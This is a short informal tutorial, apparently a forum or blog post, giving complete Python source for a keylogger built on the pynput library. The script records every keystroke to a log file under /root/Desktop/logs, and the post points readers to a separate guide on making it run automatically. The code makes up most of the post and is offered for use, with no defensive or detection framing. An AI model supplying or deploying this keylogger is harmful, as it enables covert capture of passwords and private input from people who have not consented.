1- We're gonna be using pynput so first you gotta have pip installed (i made a tutorial on that), then install 
pynput by typing in terminal (pip3 install pynput)

2- Create the file where you wanna save the history 

Code :
from pynput.keyboard import Key, Listener
import logging

log_directory = r"/root/Desktop/logs/"  #the path to the file that u created before 

logging.basicConfig(filename = (log_directory+"keylog.txt"), level = logging.DEBUG)

def on_press(key):
    logging.info(str(key))

with Listener(on_press = on_press) as listener:
    listener.join()

-------------------------------------
Well this program works but only after making it run in the terminal x) 
if u wanna automate / schedule this script to run automatically make sure to check my automation tutorial
